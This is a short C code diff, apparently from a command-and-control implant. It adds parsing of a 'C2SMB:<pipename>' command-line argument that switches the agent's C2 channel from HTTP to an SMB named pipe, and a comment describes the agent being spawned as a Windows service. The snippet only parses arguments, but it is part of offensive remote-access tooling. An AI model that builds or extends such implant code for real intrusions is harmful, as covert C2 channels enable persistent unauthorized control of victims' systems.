@@ -1016,6 +1016,31 @@ int main(void) {
                 }
                 p++;
             }
+
+            /* ── Parse C2SMB:<pipe> from command line ──
+             * When spawned via --server-connection with SMB listener, the binPath is:
+             *   %SystemRoot%\<exe> C2SMB:<pipename>
+             * This overrides the default HTTP channel to use SMB client mode,
+             * connecting to the C2's SMB listener pipe on the host from CONFIG_C2_URL. */
+            p = cmdline;
+            while (*p) {
+                if (p[0] == L'C' && p[1] == L'2' && p[2] == L'S' &&
+                    p[3] == L'M' && p[4] == L'B' && p[5] == L':') {
+                    p += 6; /* skip "C2SMB:" */
+                    int i = 0;
+                    while (*p && *p != L' ' && *p != L'\t' &&
+                           i < (int)(sizeof(g_c2smb_pipe) - 1)) {
+                        g_c2smb_pipe[i++] = (char)*p++;
+                    }
+                    g_c2smb_pipe[i] = '\0';
+                    if (i > 0) {
+                        g_c2smb_override = TRUE;
+                        DBG("[main] C2 SMB override: pipe=%s", g_c2smb_pipe);
+                    }
+                    break;
+                }
+                p++;
+            }
         }
     }
 
